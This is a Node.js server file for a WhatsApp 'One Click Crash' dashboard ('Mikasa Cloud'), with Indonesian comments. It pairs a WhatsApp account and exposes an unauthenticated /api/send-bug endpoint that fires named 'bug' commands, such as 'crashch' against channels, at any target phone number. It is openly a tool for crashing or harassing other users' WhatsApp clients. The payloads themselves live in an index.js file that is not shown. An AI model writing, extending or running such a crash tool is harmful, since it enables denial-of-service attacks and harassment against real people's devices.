// server.js
const express = require('express');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const chalk = require('chalk');
const fs = require('fs'); 
const Handlebars = require('handlebars');
const { allowInsecurePrototypeAccess } = require('@handlebars/allow-prototype-access');

// Import bot logic from index.js
const { bot, startSesi, setSocketIO, Mikasa, bugCommands, deleteSession } = require('./index.js');
const config = require('./config.js');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;

// Konfigurasi Handlebars tanpa express-handlebars view engine
const handlebars = allowInsecurePrototypeAccess(Handlebars);

// Middleware to parse JSON and URL-encoded bodies
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const noAuthMiddleware = (req, res, next) => next(); // Middleware tanpa otentikasi

// --- API Endpoints ---

app.post('/api/request-pairing', noAuthMiddleware, async (req, res) => {
    const { phoneNumber } = req.body;
    const socketId = req.headers['x-socket-id'];

    if (!phoneNumber) {
        return res.status(400).json({ error: 'Phone number is required.' });
    }

    let cleanedPhoneNumber = phoneNumber.replace(/[^0-9]/g, "");
    if (!cleanedPhoneNumber.startsWith('62')) {
        cleanedPhoneNumber = '62' + cleanedPhoneNumber;
    }

    try {
        if (!Mikasa) {
            if (io && socketId) {
                 io.to(socketId).emit('whatsapp-pairing-error', { phoneNumber: cleanedPhoneNumber, error: 'Klien WhatsApp belum siap. Coba lagi sebentar.' });
            }
            return res.status(500).json({ error: 'WhatsApp client is not initialized. Please wait or restart.' });
        }
        if (Mikasa && Mikasa.user && Mikasa.user.id) { 
            const currentLinkedNumber = Mikasa.user.id.split(':')[0].split('@')[0]; 
            if (currentLinkedNumber === cleanedPhoneNumber) {
                return res.json({ status: 'info', message: 'WhatsApp is already connected with this number.' });
            } else {
                 if (io && socketId) {
                    io.to(socketId).emit('whatsapp-pairing-error', { phoneNumber: cleanedPhoneNumber, error: `WhatsApp sudah terhubung dengan nomor lain (${currentLinkedNumber}). Hapus sesi dulu jika ingin ganti.` });
                 }
                return res.status(409).json({ status: 'conflict', message: 'WhatsApp already connected with a different number.' });
            }
        }

        if (io && socketId) {
            io.to(socketId).emit('whatsapp-status', { status: 'Pairing Initiated', message: 'Memulai proses pairing WhatsApp...' });
        }

        await Mikasa.requestPairingCode(cleanedPhoneNumber, "MIKASAAA");
        
        res.json({ status: 'success', message: 'Pairing process initiated. Check dashboard for code/QR.' });

    } catch (error) {
        console.error(chalk.red('Error in /api/request-pairing:'), error);
        if (io && socketId) {
            io.to(socketId).emit('whatsapp-pairing-error', { phoneNumber: cleanedPhoneNumber, error: `Gagal memulai pairing: ${error.message}. Pastikan nomor benar.` });
        }
        res.status(500).json({ error: 'Failed to initiate pairing. Ensure bot is running and number is valid.' });
    }
});

app.post('/api/send-bug', noAuthMiddleware, async (req, res) => {
    const { command, target } = req.body;
    const socketId = req.headers['x-socket-id'];

    if (!command || !target) {
        return res.status(400).json({ error: 'Command and target are required.' });
    }

    let formattedTarget = target.replace(/[^0-9]/g, "");
    if (command === 'crashch') {
        if (!formattedTarget.endsWith('@newsletter')) {
            formattedTarget += '@newsletter';
        }
    } else {
        formattedTarget += "@s.whatsapp.net";
    }

    if (!Mikasa || !Mikasa.user) {
        return res.status(503).json({ error: 'WhatsApp bot is not connected. Please pair first.' });
    }

    if (!bugCommands[command]) {
        return res.status(400).json({ error: `Invalid bug command: ${command}` });
    }

    try {
        if (io && socketId) {
            io.to(socketId).emit('bug-progress', { status: 'started', command: command, target: target, message: `Mengirim bug ${command} ke ${target}...` });
        }
        await bugCommands[command](formattedTarget); 
        res.json({ status: 'success', message: `${command} bug sent to ${target}. Progress will be updated.` });
    } catch (error) {
        console.error(chalk.red(`Error sending bug command '${command}' to '${target}':`), error);
        if (io && socketId) {
            io.to(socketId).emit('bug-progress', { status: 'error', command: command, target: target, message: `Gagal mengirim ${command} ke ${target}: ${error.message}` });
        }
        res.status(500).json({ error: `Failed to send bug: ${error.message}` });
    }
});

app.post('/api/delete-session', noAuthMiddleware, async (req, res) => {
    const socketId = req.headers['x-socket-id'];
    try {
        const success = deleteSession(); 
        if (success) {
            if (io && socketId) {
                io.to(socketId).emit('whatsapp-status', { status: 'Session Deleted', message: 'Sesi WhatsApp berhasil dihapus. Silakan pairing ulang.' });
            }
            res.json({ status: 'success', message: 'Sesi WhatsApp berhasil dihapus.' });
        } else {
            res.status(404).json({ status: 'info', message: 'Tidak ada sesi WhatsApp yang tersimpan saat ini.' });
        }
    } catch (error) {
        console.error(chalk.red('Error deleting session:'), error);
        res.status(500).json({ error: 'Gagal menghapus sesi.' });
    }
});

app.post('/api/restart-bot', noAuthMiddleware, async (req, res) => {
    const socketId = req.headers['x-socket-id'];
    try {
        if (io && socketId) {
            io.to(socketId).emit('bot-status', { status: 'restarting', message: 'Bot sedang me-restart...' });
        }
        res.json({ status: 'success', message: 'Proses restart bot dimulai.' });
        console.log(chalk.yellow('Restarting bot process...'));
        setTimeout(() => { process.exit(0); }, 2000); 
    } catch (error) {
        console.error(chalk.red('Error restarting bot:'), error);
        res.status(500).json({ error: 'Gagal me-restart bot.' });
    }
});

app.use(express.static(path.join(__dirname))); 

app.get('/', (req, res) => {
    res.send(compiledTemplate({ 
        title: 'Mikasa Cloud - Bot Dashboard',
        currentYear: new Date().getFullYear()
    }));
});

app.get('/style.css', (req, res) => {
    res.type('text/css');
    res.send(cssContent);
});

app.get('/script.js', (req, res) => {
    res.type('application/javascript');
    res.send(jsContent);
});

io.on('connection', (socket) => {
    console.log(chalk.green(`A user connected via WebSocket. Socket ID: ${socket.id}`));
    socket.emit('whatsapp-status', { 
        status: Mikasa && Mikasa.user ? 'Successfully' : 'Disconnected',
        message: Mikasa && Mikasa.user ? 'WhatsApp connected!' : 'WhatsApp disconnected!',
        number: Mikasa && Mikasa.user ? Mikasa.user.id.split(':')[0] : 'N/A'
    });

    socket.on('disconnect', () => {
        console.log(chalk.red(`User disconnected from WebSocket. Socket ID: ${socket.id}`));
    });
});

let htmlTemplateRaw;
let compiledTemplate;
let cssContent;
let jsContent;

async function initializeApp() {
    console.clear();
    console.log(chalk.blue("Starting Mikasa Cloud Bot Dashboard Server..."));

    try {
        htmlTemplateRaw = fs.readFileSync(path.join(__dirname, 'index.html'), 'utf8');
        cssContent = fs.readFileSync(path.join(__dirname, 'style.css'), 'utf8');
        jsContent = fs.readFileSync(path.join(__dirname, 'script.js'), 'utf8');
        compiledTemplate = handlebars.compile(htmlTemplateRaw); 
        console.log(chalk.green("Frontend files loaded successfully."));
    } catch (error) {
        console.error(chalk.red("Error loading frontend files:"), error);
        process.exit(1);
    }

    setSocketIO(io); 
    startSesi(); 
    bot.launch(); 

    console.log(chalk.bold.blue(` 
┏━━[ One Click Crash ]
┃ Developer : kepFoЯannas
┃ Versi     : 4.0 Remake
┃ Type      : Button
┗━━━━━━━━━━━━━━━━━━━━━❍
`));
    console.log(chalk.bold.green("✅ Bot Active Now !!!"));
    console.log(chalk.blue(`🚀 Server listening on http://localhost:${PORT}`));
    console.log(chalk.blue(`🌐 Web dashboard available at http://localhost:${PORT}`));
}

initializeApp();

process.once('SIGINT', () => {
    console.log(chalk.yellow('SIGINT received. Shutting down gracefully...'));
    bot.stop('SIGINT');
    if (Mikasa) Mikasa.end(); 
    server.close(() => {
        console.log(chalk.green('HTTP server closed.'));
        process.exit(0);
    });
});
process.once('SIGTERM', () => {
    console.log(chalk.yellow('SIGTERM received. Shutting down gracefully...'));
    bot.stop('SIGTERM');
    if (Mikasa) Mikasa.end(); 
    server.close(() => {
        console.log(chalk.green('HTTP server closed.'));
        process.exit(0);
    });
});